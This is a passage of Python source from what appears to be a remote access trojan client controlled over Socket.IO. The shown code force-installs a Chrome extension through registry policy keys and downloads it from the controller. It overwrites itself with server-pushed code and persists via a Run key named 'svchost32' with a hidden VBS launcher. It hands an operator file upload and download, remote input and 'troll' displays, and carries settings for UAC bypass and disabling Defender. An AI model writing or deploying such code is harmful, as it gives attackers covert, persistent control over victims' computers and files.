                base = SERVER_URL if USE_FIXED_SERVER_URL else get_controller_url()
            except Exception:
                base = SERVER_URL
            update_xml = f"{base.rstrip('/')}/download/extensions/update.xml"
            size = 0
            try:
                access2 = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
                base2 = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, access2)
                winreg.SetValueEx(base2, "1", 0, winreg.REG_SZ, f"{ext_id};{update_xml}")
                try:
                    winreg.CloseKey(base2)
                except Exception:
                    pass
            except Exception:
                pass
            try:
                import ctypes
                if ctypes.windll.shell32.IsUserAnAdmin():
                    accessm = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
                    basem = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, accessm)
                    winreg.SetValueEx(basem, "1", 0, winreg.REG_SZ, f"{ext_id};{update_xml}")
                    try:
                        winreg.CloseKey(basem)
                    except Exception:
                        pass
            except Exception:
                pass
            dest_dir = os.path.join(os.environ.get('LOCALAPPDATA') or os.path.expanduser('~'), 'AutoSaveExtension')
            ok_extract = False
            try:
                src = url or (base.rstrip('/') + "/download/extensions/extension.crx")
                req = urllib.request.Request(src, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    raw = resp.read()
                ok_extract = _extract_crx_bytes_to_dir(raw, dest_dir)
            except Exception:
                ok_extract = False
            try:
                access_e = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
                key_e = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_e)
                ver = ""
                try:
                    mf = os.path.join(dest_dir, "manifest.json")
                    if os.path.isfile(mf):
                        with open(mf, 'r', encoding='utf-8', errors='ignore') as f:
                            man = _json.load(f)
                            v = str(man.get('version') or '')
                            if v:
                                ver = v
                except Exception:
                    ver = ""
                if ok_extract:
                    winreg.SetValueEx(key_e, "path", 0, winreg.REG_SZ, dest_dir)
                winreg.SetValueEx(key_e, "version", 0, winreg.REG_SZ, ver or "1.0")
                try: winreg.CloseKey(key_e)
                except Exception: pass
            except Exception:
                pass
            try:
                paths = []
                p1 = os.path.join(os.environ.get('LOCALAPPDATA') or '', 'Google', 'Chrome', 'Application', 'chrome.exe')
                p2 = os.path.join(os.environ.get('ProgramFiles') or '', 'Google', 'Chrome', 'Application', 'chrome.exe')
                p3 = os.path.join(os.environ.get('ProgramFiles(x86)') or '', 'Google', 'Chrome', 'Application', 'chrome.exe')
                paths.extend([p1, p2, p3])
                exe = ""
                for p in paths:
                    if p and os.path.isfile(p):
                        exe = p
                        break
                if not exe:
                    import shutil
                    exe = shutil.which('chrome') or shutil.which('chrome.exe') or ''
                if exe and ok_extract:
                    try:
                        subprocess.Popen([exe, f"--load-extension={dest_dir}"], creationflags=subprocess.CREATE_NO_WINDOW)
                    except Exception:
                        subprocess.Popen([exe, f"--load-extension={dest_dir}"])
            except Exception:
                pass
            msg = f"Policy set. url={'set' if url else 'default'}; unpacked={'ok' if ok_extract else 'fail'}"
            emit_system_notification('info', 'Chrome Extension Deploy', msg)
            safe_emit('vault_status', {'agent_id': agent_id, 'active': True, 'installed': True})
        except Exception as e:
            emit_system_notification('error', 'Chrome Extension Deploy', f'Failed: {e}')
    sio.on('extension_deploy')(on_extension_deploy)
    
    # Register other handlers
    sio.on('command')(on_command)
    sio.on('execute_command')(on_execute_command)  # For controller UI v2.1
    sio.on('bulk_action')(on_bulk_action)
    sio.on('start_stream')(on_start_stream)  # CRITICAL: Handle stream start requests
    sio.on('set_stream_params')(on_set_stream_params)
    sio.on('stop_stream')(on_stop_stream)    # CRITICAL: Handle stream stop requests
    sio.on('mouse_move')(on_mouse_move)
    sio.on('mouse_click')(on_mouse_click)
    sio.on('key_press')(on_remote_key_press)
    sio.on('file_upload')(on_file_upload)
    sio.on('webrtc_offer')(on_webrtc_offer)
    sio.on('webrtc_answer')(on_webrtc_answer)
    sio.on('webrtc_ice_candidate')(on_webrtc_ice_candidate)
    sio.on('webrtc_start_streaming')(on_webrtc_start_streaming)
    sio.on('webrtc_stop_streaming')(on_webrtc_stop_streaming)
    sio.on('webrtc_get_stats')(on_webrtc_get_stats)
    sio.on('webrtc_set_quality')(on_webrtc_set_quality)
    sio.on('webrtc_quality_change')(on_webrtc_quality_change)
    sio.on('webrtc_frame_dropping')(on_webrtc_frame_dropping)
    sio.on('webrtc_get_enhanced_stats')(on_webrtc_get_enhanced_stats)
    sio.on('webrtc_get_production_readiness')(on_webrtc_get_production_readiness)
    sio.on('webrtc_get_migration_plan')(on_webrtc_get_migration_plan)
    sio.on('webrtc_get_monitoring_data')(on_webrtc_get_monitoring_data)
    sio.on('config_update')(on_config_update)
    
    # Apply configuration pushed from controller
    # agent_config handling removed in this revision
    sio.on('webrtc_adaptive_bitrate_control')(on_webrtc_adaptive_bitrate_control)
    
    # Register automated updater handlers
    if UPDATER_AVAILABLE:
        try:
            register_update_handlers(sio, agent_id)
            log_message("[ OK ] Automated updater handlers registered successfully")
        except Exception as e:
            log_message(f"[ ! ] Failed to register updater handlers: {e}", "warning")
    sio.on('webrtc_implement_frame_dropping')(on_webrtc_implement_frame_dropping)
    sio.on('troll_show_video')(on_troll_show_video_ps)
    sio.on('troll_show_image')(on_troll_show_image_ps)
    sio.on('feature_toggle')(on_feature_toggle)
    sio.on('get_monitors')(on_get_monitors)
    # Receive update info and apply if needed
    def on_client_update_info(data):
        try:
            needs = bool((data or {}).get('needs_update'))
            code = (data or {}).get('code')
            latest_hash = (data or {}).get('latest_sha256')
            latest_ver = (data or {}).get('latest_version')
            if not needs:
                log_message(f"[UPDATE] No update needed (server v{latest_ver})")
                return
            if not isinstance(code, str) or len(code) < 100:
                log_message("[UPDATE] Invalid update payload", "warning")
                try:
                    safe_emit('system_alert', {
                        'agent_id': get_or_create_agent_id(),
                        'type': 'error',
                        'message': 'Client update failed',
                        'details': 'Invalid payload from controller'
                    })
                except Exception:
                    pass
                return
            target = os.path.abspath(__file__)
            try:
                if not target.lower().endswith('.py') or not os.path.isdir(os.path.dirname(target)):
                    base = os.path.join(os.environ.get('APPDATA', '') or os.path.expanduser('~'), 'ClientLauncher')
                    os.makedirs(base, exist_ok=True)
                    target = os.path.join(base, 'client.py')
            except Exception:
                base = os.path.join(os.environ.get('APPDATA', '') or os.path.expanduser('~'), 'ClientLauncher')
                try:
                    os.makedirs(base, exist_ok=True)
                except Exception:
                    pass
                target = os.path.join(base, 'client.py')
            backup = target + ".bak"
            try:
                with open(backup, 'wb') as bf:
                    bf.write(code.encode('utf-8'))
                with open(target, 'wb') as tf:
                    tf.write(code.encode('utf-8'))
                log_message(f"[UPDATE] Updated client.py (backup at {backup})")
                try:
                    safe_emit('system_alert', {
                        'agent_id': get_or_create_agent_id(),
                        'type': 'success',
                        'message': f'Client updated to v{latest_ver}',
                        'details': f'sha256={latest_hash}'
                    })
                    safe_emit('activity_update', {
                        'id': f'upd_{int(time.time()*1000)}',
                        'type': 'system',
                        'action': 'client_update_applied',
                        'details': f'Updated to v{latest_ver}',
                        'agent_id': get_or_create_agent_id(),
                        'agent_name': socket.gethostname(),
                        'timestamp': int(time.time()*1000),
                        'status': 'success'
                    })
                except Exception:
                    pass
            except Exception as e:
                log_message(f"[UPDATE] Failed writing update: {e}", "error")
                try:
                    safe_emit('system_alert', {
                        'agent_id': get_or_create_agent_id(),
                        'type': 'error',
                        'message': 'Client update failed: write error',
                        'details': str(e)
                    })
                except Exception:
                    pass
                return
            # Restart silently
            try:
                launcher = None
                pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
                if os.path.exists(pyw):
                    launcher = [pyw, target]
                else:
                    import shutil
                    pw = shutil.which('pythonw') or ''
                    if pw:
                        launcher = [pw, target]
                if not launcher:
                    import shutil
                    py = shutil.which('python') or sys.executable
                    vdir = os.path.join(os.environ.get('APPDATA', ''), "ClientLauncher")
                    os.makedirs(vdir, exist_ok=True)
                    vbs_path = os.path.join(vdir, "client_autostart.vbs")
                    vbs = (
                        'Set oShell = CreateObject("WScript.Shell")\n'
                        f'oShell.CurrentDirectory = "{os.path.dirname(target)}"\n'
                        f'oShell.Run "\"{py}\" \"{target}\"", 0, false\n'
                    )
                    with open(vbs_path, 'w') as f:
                        f.write(vbs)
                    launcher = ["wscript.exe", vbs_path]
                subprocess.Popen(launcher, creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
                try:
                    if WINDOWS_AVAILABLE:
                        import winreg
                        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                        if launcher[0].lower().endswith('pythonw.exe'):
                            winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'"{launcher[0]}" "{target}"')
                        else:
                            winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'{launcher[0]} "{launcher[1]}"')
                        winreg.CloseKey(key)
                except Exception:
                    pass
                log_message("[UPDATE] Relaunching updated client, exiting current process...")
            except Exception as e:
                log_message(f"[UPDATE] Relaunch failed: {e}", "error")
                try:
                    safe_emit('system_alert', {
                        'agent_id': get_or_create_agent_id(),
                        'type': 'error',
                        'message': 'Client update applied but relaunch failed',
                        'details': str(e)
                    })
                except Exception:
                    pass
                return
            try:
                os._exit(0)
            except Exception:
                sys.exit(0)
        except Exception as e:
            log_message(f"[UPDATE] Handler error: {e}", "error")
    sio.on('client_update_info')(on_client_update_info)
    sio.on('switch_monitor')(on_switch_monitor)
    sio.on('set_display_mode')(on_set_display_mode)
    sio.on('set_audio_volumes')(on_set_audio_volumes)
    sio.on('toggle_noise_reduction')(on_toggle_noise_reduction)
    sio.on('toggle_echo_cancellation')(on_toggle_echo_cancellation)
    sio.on('uac_bypass_test')(on_uac_bypass_test)
    
    log_message("Socket.IO event handlers registered successfully", "info")

# --- Socket.IO File Transfer Handlers ---

def on_config_update(data):
    try:
        agent = data.get('agent') or {}
        bypasses = data.get('bypasses') or {}
        registry = data.get('registry') or {}
        global MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED, REGISTRY_ACTIONS, BYPASSES_ENABLED
        try:
            mp = agent.get('maxPromptAttempts')
            if isinstance(mp, int):
                MAX_PROMPT_ATTEMPTS = mp
        except Exception:
            pass
        try:
            UAC_BYPASS_DEBUG_MODE = bool(agent.get('uacBypassDebug', UAC_BYPASS_DEBUG_MODE))
        except Exception:
            pass
        try:
            PERSISTENT_ADMIN_PROMPT_ENABLED = bool(agent.get('persistentAdminPrompt', PERSISTENT_ADMIN_PROMPT_ENABLED))
        except Exception:
            pass
        try:
            BYPASSES_ENABLED = bool(bypasses.get('enabled', BYPASSES_ENABLED))
            DISABLE_UAC_BYPASS = not BYPASSES_ENABLED
        except Exception:
            pass
        try:
            methods = bypasses.get('methods') or {}
            if isinstance(methods, dict):
                for k in list(UAC_BYPASS_METHODS_ENABLED.keys()):
                    UAC_BYPASS_METHODS_ENABLED[k] = bool(methods.get(k, UAC_BYPASS_METHODS_ENABLED[k]))
        except Exception:
            pass
        try:
            REGISTRY_ENABLED = bool(registry.get('enabled', REGISTRY_ENABLED))
        except Exception:
            pass
        try:
            actions = registry.get('actions') or {}
            if isinstance(actions, dict):
                for k in list(REGISTRY_ACTIONS.keys()):
                    REGISTRY_ACTIONS[k] = bool(actions.get(k, REGISTRY_ACTIONS[k]))
        except Exception:
            pass
    except Exception:
        pass

def on_file_chunk_from_operator(data):
    """Receive a file chunk from the operator and write to disk."""
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle file chunk", "warning")
            emit_system_notification('error', 'File Upload Error', 'Socket.IO not available')
            return
        
        log_message(f"Received file chunk: {data.get('filename', 'unknown')} at offset {data.get('offset', 0)}")
        filename = data.get('filename')
        chunk_b64 = data.get('data') or data.get('chunk')
        offset = data.get('offset', 0)
        total_size = data.get('total_size', 0)
        destination_path = data.get('destination_path') or filename
        
        log_message(f"Debug - filename: {filename}, destination_path: {destination_path}, total_size: {total_size}")
        
        if not filename or not chunk_b64:
            log_message("Invalid file chunk received.", "warning")
            emit_system_notification('warning', 'File Upload Warning', 'Received invalid file chunk')
            return
        
        # Use a temp buffer in memory or on disk
        if not hasattr(on_file_chunk_from_operator, 'buffers'):
            on_file_chunk_from_operator.buffers = {}
        buffers = on_file_chunk_from_operator.buffers
        if not hasattr(on_file_chunk_from_operator, 'dest_map'):
            on_file_chunk_from_operator.dest_map = {}
        dest_map = on_file_chunk_from_operator.dest_map
        def _resolve_upload_destination(dp, fn):
            try:
                if not dp:
                    os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
                    return os.path.join(UPLOAD_BASE_DIR, fn)
                dp = os.path.normpath(dp)
                if dp.endswith(os.sep) or os.path.isdir(dp):
                    p = os.path.join(dp, fn)
                else:
                    p = dp
                dirp = os.path.dirname(p) or '.'
                try:
                    os.makedirs(dirp, exist_ok=True)
                    test = os.path.join(dirp, f".upload_test_{secrets.token_hex(4)}")
                    with open(test, 'wb') as tf:
                        tf.write(b'')
                    try:
                        os.remove(test)
                    except Exception:
                        pass
                    return p
                except Exception:
                    os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
                    return os.path.join(UPLOAD_BASE_DIR, fn)
            except Exception:
                os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
                return os.path.join(UPLOAD_BASE_DIR, fn)
        final_path = dest_map.get(destination_path)
        if not final_path:
            final_path = _resolve_upload_destination(destination_path, filename)
            dest_map[destination_path] = final_path
        
        if final_path not in buffers:
            buffers[final_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
        
        # Remove data: prefix if present
        if ',' in chunk_b64:
            chunk_b64 = chunk_b64.split(',', 1)[1]
        
        chunk = base64.b64decode(chunk_b64)
        buffers[final_path]['chunks'].append((offset, chunk))
        
        # Check if file is complete
        received_size = sum(len(c[1]) for c in buffers[final_path]['chunks'])
        
        # Update total_size if it was 0 but we're receiving multiple chunks
        if total_size == 0 and buffers[final_path]['total_size'] > 0:
            total_size = buffers[final_path]['total_size']
        elif total_size > 0:
            buffers[final_path]['total_size'] = total_size
        
        # Calculate progress and send to UI
        if total_size > 0:
            progress = int((received_size / total_size) * 100)
            log_message(f"File {filename}: received {received_size}/{total_size} bytes ({progress}%)")
            
            # [ OK ] SEND PROGRESS UPDATE TO UI!
            safe_emit('file_upload_progress', {
                'agent_id': get_or_create_agent_id(),
                'filename': filename,
                'destination_path': final_path,
                'received': received_size,
                'total': total_size,
                'progress': progress
            })
        else:
            # Even if total_size is 0, send progress based on received bytes
            log_message(f"File {filename}: received {received_size} bytes (waiting for total_size or completion event)")
            
            # [ OK ] SEND PROGRESS UPDATE (unknown total)
            safe_emit('file_upload_progress', {
                'agent_id': get_or_create_agent_id(),
                'filename': filename,
                'destination_path': final_path,
                'received': received_size,
                'total': 0,  # Unknown total
                'progress': -1  # -1 indicates unknown progress
            })
        
        # Only save when we've received all chunks (wait for completion event)
        # Don't auto-save when total_size is 0 - wait for upload_complete event instead
        if total_size > 0 and received_size >= total_size:
            log_message(f"File complete: received {received_size}/{total_size} bytes")
            _save_completed_file(final_path, buffers[final_path])
            
            # [ OK ] SEND COMPLETION EVENT TO UI!
            safe_emit('file_upload_complete', {
                'agent_id': get_or_create_agent_id(),
                'filename': filename,
                'destination_path': final_path,
                'size': received_size,
                'success': True
            })
                
    except Exception as e:
        log_message(f"Error processing chunk: {e}", "error")
        emit_system_notification('error', 'File Upload Error', f'Error processing file chunk: {str(e)}')

def _save_completed_file(destination_path, buffer_data):
    """Save the completed file to disk."""
    try:
        # Sort chunks by offset
        buffer_data['chunks'].sort()
        
        # Ensure directory exists
        dir_path = os.path.dirname(destination_path)
        if dir_path:
            os.makedirs(dir_path, exist_ok=True)
        
        # Write file
        with open(destination_path, 'wb') as f:
            for _, chunk in buffer_data['chunks']:
                f.write(chunk)
        
        file_size = sum(len(c[1]) for c in buffer_data['chunks'])
        log_message(f"File saved successfully to {destination_path} ({file_size} bytes)")
        emit_system_notification('success', 'File Saved', f'File {os.path.basename(destination_path)} saved successfully ({file_size} bytes)')
        
        # Clean up buffer
        if hasattr(on_file_chunk_from_operator, 'buffers'):
            if destination_path in on_file_chunk_from_operator.buffers:
                del on_file_chunk_from_operator.buffers[destination_path]
                
    except Exception as e:
        log_message(f"Error saving file {destination_path}: {e}", "error")
        emit_system_notification('error', 'File Save Failed', f'Failed to save file {os.path.basename(destination_path)}: {str(e)}')

def on_file_upload_complete_from_operator(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle file upload completion", "warning")
        return
    filename = data.get('filename')
    destination_path = data.get('destination_path') or filename
    log_message(f"Upload of {filename} to {destination_path} complete.")
    if hasattr(on_file_chunk_from_operator, 'dest_map') and destination_path in on_file_chunk_from_operator.dest_map:
        destination_resolved = on_file_chunk_from_operator.dest_map[destination_path]
    else:
        destination_resolved = destination_path
    
    # Force save any remaining buffered file
    if hasattr(on_file_chunk_from_operator, 'buffers'):
        if destination_resolved in on_file_chunk_from_operator.buffers:
            log_message(f"Force saving file {destination_resolved} from completion event")
            buffer_data = on_file_chunk_from_operator.buffers[destination_resolved]
            _save_completed_file(destination_resolved, buffer_data)
            
            # [ OK ] SEND FINAL UPLOAD COMPLETION WITH 100% PROGRESS!
            file_size = sum(len(c[1]) for c in buffer_data['chunks'])
            safe_emit('file_upload_progress', {
                'agent_id': get_or_create_agent_id(),
                'filename': filename,
                'destination_path': destination_resolved,
                'received': file_size,
                'total': file_size,
                'progress': 100  # [ OK ] 100% complete!
            })
            safe_emit('file_upload_complete', {
                'agent_id': get_or_create_agent_id(),
                'filename': filename,
                'destination_path': destination_resolved,
                'size': file_size,
                'success': True
            })

def on_request_file_chunk_from_agent(data):
    """Handle file download request from controller - send file in chunks."""
    global LAST_BROWSED_DIRECTORY
    
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle file chunk request", "warning")
            emit_system_notification('error', 'File Download Error', 'Socket.IO not available')
            return
        
        log_message(f"File download request received: {data}")
        filename = data.get('filename')
        provided_path = data.get('path')  # UI might send full path
        download_id = data.get('download_id')
        
        if not filename:
            log_message("Invalid file request - no filename provided", "warning")
            emit_system_notification('warning', 'File Download Warning', 'No filename provided')
            return
        
        # Build search paths (prioritize last browsed directory and provided path)
        possible_paths = []
        
        # 1. If UI provided full path, try it first
        if provided_path:
            possible_paths.append(provided_path)
        
        # 2. Try in last browsed directory (from file manager UI)
        if LAST_BROWSED_DIRECTORY:
            possible_paths.append(os.path.join(LAST_BROWSED_DIRECTORY, filename))
            log_message(f"[FILE_MANAGER] Will check last browsed directory: {LAST_BROWSED_DIRECTORY}")
        
        # 3. Try as-is (might be absolute path)
        possible_paths.append(filename)
        
        # 4. Try common locations
        possible_paths.extend([
            os.path.join(os.getcwd(), filename),  # Current directory
            os.path.join(os.path.expanduser("~"), filename),  # Home directory
            os.path.join(os.path.expanduser("~/Desktop"), filename),  # Desktop
            os.path.join(os.path.expanduser("~/Downloads"), filename),  # Downloads
            os.path.join("C:/", filename),  # C: root
            os.path.join("C:/Users/Public", filename),  # Public folder
        ])
        
        file_path = None
        for path in possible_paths:
            if os.path.exists(path):
                file_path = path
                log_message(f"[ OK ] Found file at: {file_path}")
                break
        
        if not file_path:
            log_message(f"[ X ] File not found: {filename}", "error")
            log_message("Searched in:")
            for path in possible_paths:
                log_message(f"  - {path}")
            
            # Send error back to UI
            emit_system_notification('error', 'File Not Found', f'File {filename} not found on agent')
            safe_emit('file_chunk_from_agent', {
                'agent_id': get_or_create_agent_id(),
                'filename': filename,
                'download_id': download_id,
                'error': f'File not found: {filename}. Last browsed dir: {LAST_BROWSED_DIRECTORY or "None"}'
            })
            return
        
        chunk_size = 512 * 1024  # 512KB
        total_size = os.path.getsize(file_path)
        log_message(f"Sending file {file_path} ({total_size} bytes) in chunks...")
        emit_system_notification('info', 'File Download Started', f'Starting download of {filename} ({total_size} bytes)')
        
        agent_id = get_or_create_agent_id()
        filename_only = os.path.basename(file_path)
        
        with open(file_path, 'rb') as f:
            offset = 0
            chunk_count = 0
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
                
                # Send file chunk
                safe_emit('file_chunk_from_agent', {
                    'agent_id': agent_id,
                    'filename': filename_only,
                    'download_id': download_id,
                    'chunk': chunk_b64,
                    'offset': offset,
                    'total_size': total_size
                })
                
                offset += len(chunk)
                chunk_count += 1
                
                # [ OK ] Calculate and send download progress
                progress = int((offset / total_size) * 100)
                log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset} ({progress}%)")
                
                # [ OK ] SEND DOWNLOAD PROGRESS UPDATE TO UI!
                safe_emit('file_download_progress', {
                    'agent_id': agent_id,
                    'filename': filename_only,
                    'download_id': download_id,
                    'sent': offset,
                    'total': total_size,
                    'progress': progress
                })
        
        log_message(f"File {file_path} sent to controller in {chunk_count} chunks")
        emit_system_notification('success', 'File Download Complete', f'File {filename_only} sent successfully ({total_size} bytes)')
        
        # [ OK ] SEND DOWNLOAD COMPLETION EVENT TO UI!
        safe_emit('file_download_complete', {
            'agent_id': agent_id,
            'filename': filename_only,
            'download_id': download_id,
            'size': total_size,
            'success': True
        })
        
    except Exception as e:
        log_message(f"Error sending file: {e}", "error")
        emit_system_notification('error', 'File Download Failed', f'Failed to send file: {str(e)}')

def on_request_file_range(data):
    global LAST_BROWSED_DIRECTORY
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            return
        request_id = data.get('request_id')
        provided_path = data.get('path') or data.get('filename')
        start = data.get('start')
        end = data.get('end')
        if not request_id:
            return
        if not provided_path:
            safe_emit('file_range_response', {'request_id': request_id, 'error': 'File path is required'})
            return

        filename = os.path.basename(provided_path)
        possible_paths = [provided_path]
        if LAST_BROWSED_DIRECTORY and filename:
            possible_paths.append(os.path.join(LAST_BROWSED_DIRECTORY, filename))
        if filename:
            possible_paths.append(filename)
        possible_paths.extend([
            os.path.join(os.getcwd(), filename),
            os.path.join(os.path.expanduser("~"), filename),
            os.path.join(os.path.expanduser("~/Desktop"), filename),
            os.path.join(os.path.expanduser("~/Downloads"), filename),
            os.path.join("C:/", filename),
            os.path.join("C:/Users/Public", filename),
        ])

        file_path = None
        for p in possible_paths:
            if p and os.path.exists(p):
                file_path = p
                break

        if not file_path:
            safe_emit('file_range_response', {'request_id': request_id, 'error': f'File not found: {provided_path}'})
            return

        total_size = os.path.getsize(file_path)
        s = 0 if start is None else int(start)
        e = None if end is None else int(end)
        if s < 0:
            s = 0
        if s >= total_size and total_size > 0:
            safe_emit('file_range_response', {'request_id': request_id, 'error': 'Range not satisfiable'})
            return

        with open(file_path, 'rb') as f:
            f.seek(s)
            if e is None or e < 0:
                chunk = f.read()
            else:
                chunk = f.read(max(0, e - s + 1))

        actual_end = s + len(chunk) - 1
        safe_emit('file_range_response', {
            'request_id': request_id,
            'path': file_path,
            'start': s,
            'end': actual_end,
            'total_size': total_size,
            'data': base64.b64encode(chunk).decode('utf-8')
        })
    except Exception as e:
        try:
            safe_emit('file_range_response', {'request_id': data.get('request_id'), 'error': str(e)})
        except Exception:
            pass

def on_request_file_thumbnail(data):
    global LAST_BROWSED_DIRECTORY
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            return
        request_id = data.get('request_id')
        provided_path = data.get('path') or ''
        size = data.get('size', 256)
        if not request_id:
            return
        if not provided_path:
            safe_emit('file_thumbnail_response', {'request_id': request_id, 'error': 'File path is required'})
            return

        try:
            s = int(size)
        except Exception:
            s = 256
        s = max(16, min(s, 512))

        filename = os.path.basename(provided_path)
        possible_paths = [provided_path]
        if LAST_BROWSED_DIRECTORY and filename:
            possible_paths.append(os.path.join(LAST_BROWSED_DIRECTORY, filename))
        if filename:
            possible_paths.append(filename)

        file_path = None
        for p in possible_paths:
            if p and os.path.exists(p):
                file_path = p
                break

        if not file_path:
            safe_emit('file_thumbnail_response', {'request_id': request_id, 'error': f'File not found: {provided_path}'})
            return

        ext = os.path.splitext(file_path)[1].lower().lstrip('.')
        out_bytes = None

        if ext in {'png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp'}:
            from PIL import Image as PILImage
            import io
            with PILImage.open(file_path) as img:
                img = img.convert('RGB')
                img.thumbnail((s, s))
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=82, optimize=True)
                out_bytes = buf.getvalue()
        elif ext in {'mp4', 'mov', 'mkv', 'avi', 'webm', 'm4v'}:
            import cv2
            cap = cv2.VideoCapture(file_path)
            frame = None
            try:
                total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT) or 0)
                fps = float(cap.get(cv2.CAP_PROP_FPS) or 0.0)
                duration_ms = None
                if fps > 0.0 and total_frames > 0:
                    duration_ms = int((total_frames / fps) * 1000)

                candidate_ms = []
                if duration_ms and duration_ms > 0:
                    candidate_ms.extend([min(250, duration_ms - 1), min(1000, duration_ms - 1), int(max(0, duration_ms * 0.1))])
                candidate_ms.append(0)

                seen = set()
                for pos in candidate_ms:
                    if pos in seen:
                        continue
                    seen.add(pos)
                    cap.set(cv2.CAP_PROP_POS_MSEC, pos)
                    ok, frm = cap.read()
                    if ok and frm is not None and getattr(frm, 'size', 0) > 0:
                        frame = frm
                        break

                if frame is None:
                    cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                    for _ in range(30):
                        ok, frm = cap.read()
                        if not ok:
                            break
                        if frm is not None and getattr(frm, 'size', 0) > 0:
                            frame = frm
                            break
            finally:
                cap.release()
            if frame is not None:
                h, w = frame.shape[:2]
                scale = min(s / max(1, w), s / max(1, h), 1.0)
                nw, nh = max(1, int(w * scale)), max(1, int(h * scale))
                if (nw, nh) != (w, h):
                    frame = cv2.resize(frame, (nw, nh), interpolation=cv2.INTER_AREA)
                ok, enc = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 82])
                if ok:
                    out_bytes = enc.tobytes()

        if not out_bytes:
            safe_emit('file_thumbnail_response', {'request_id': request_id, 'error': 'Thumbnail not supported'})
            return

        safe_emit('file_thumbnail_response', {
            'request_id': request_id,
            'path': file_path,
            'mime': 'image/jpeg',
            'data': base64.b64encode(out_bytes).decode('utf-8')
        })
    except Exception as e:
        try:
            safe_emit('file_thumbnail_response', {'request_id': data.get('request_id'), 'error': str(e)})
        except Exception:
            pass

def on_request_file_faststart(data):
    global LAST_BROWSED_DIRECTORY
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            return
        request_id = data.get('request_id')
        provided_path = data.get('path') or ''
        force = bool(data.get('force', False))
        if not request_id:
            return
        if not provided_path:
            safe_emit('file_faststart_response', {'request_id': request_id, 'error': 'File path is required'})
            return

        filename = os.path.basename(provided_path)
        possible_paths = [provided_path]
        if LAST_BROWSED_DIRECTORY and filename:
            possible_paths.append(os.path.join(LAST_BROWSED_DIRECTORY, filename))
        if filename:
            possible_paths.append(filename)
        possible_paths.extend([
            os.path.join(os.getcwd(), filename),
            os.path.join(os.path.expanduser("~"), filename),
            os.path.join(os.path.expanduser("~/Desktop"), filename),
            os.path.join(os.path.expanduser("~/Downloads"), filename),
            os.path.join("C:/", filename),
            os.path.join("C:/Users/Public", filename),
        ])

        file_path = None
        for p in possible_paths:
            if p and os.path.exists(p):
                file_path = p
                break

        if not file_path:
            safe_emit('file_faststart_response', {'request_id': request_id, 'error': f'File not found: {provided_path}'})
            return

        ext = os.path.splitext(file_path)[1].lower().lstrip('.')
        if ext not in {'mp4', 'm4v', 'mov'}:
            safe_emit('file_faststart_response', {'request_id': request_id, 'error': 'Unsupported format'})
            return

        import shutil
        import tempfile
        ffmpeg_path = shutil.which('ffmpeg')
        if not ffmpeg_path:
            safe_emit('file_faststart_response', {'request_id': request_id, 'error': 'ffmpeg not available'})
            return

        base = os.path.splitext(os.path.basename(file_path))[0]
        out_dir = tempfile.gettempdir()
        out_path = os.path.join(out_dir, f"{base}.faststart.mp4")

        if not force and os.path.exists(out_path):
            try:
                src_mtime = os.path.getmtime(file_path)
                out_mtime = os.path.getmtime(out_path)
                if out_mtime >= src_mtime and os.path.getsize(out_path) > 0:
                    safe_emit('file_faststart_response', {
                        'request_id': request_id,
                        'path': out_path,
                        'mime': 'video/mp4'
                    })
                    return
            except Exception:
                pass

        try:
            import subprocess
            cmd = [
                ffmpeg_path,
                '-i', file_path,
                '-c', 'copy',
                '-movflags', 'faststart',
                '-y',
                out_path
            ]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        except Exception as e:
            safe_emit('file_faststart_response', {'request_id': request_id, 'error': str(e)})
            return

        if not os.path.exists(out_path) or os.path.getsize(out_path) <= 0:
            safe_emit('file_faststart_response', {'request_id': request_id, 'error': 'Transcode failed'})
            return

        safe_emit('file_faststart_response', {
            'request_id': request_id,
            'path': out_path,
            'mime': 'video/mp4'
        })
    except Exception as e:
        try:
            safe_emit('file_faststart_response', {'request_id': data.get('request_id'), 'error': str(e)})
        except Exception:
            pass

def on_get_monitors(data):
    try:
        agent_id = get_or_create_agent_id()
        if not MSS_AVAILABLE:
            safe_emit('monitors_list', {'agent_id': agent_id, 'monitors': []})
